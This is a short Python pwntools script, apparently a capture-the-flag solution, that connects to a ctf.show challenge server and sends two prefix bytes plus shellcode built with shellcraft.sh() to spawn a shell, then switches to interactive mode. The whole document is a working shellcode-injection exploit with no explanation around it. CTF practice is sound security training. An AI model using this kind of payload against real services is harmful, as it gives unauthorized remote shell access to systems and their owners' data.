from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28128)
shellcode = '\x00\xc0'  + asm(shellcraft.sh())
io.sendline(shellcode)
io.interactive()
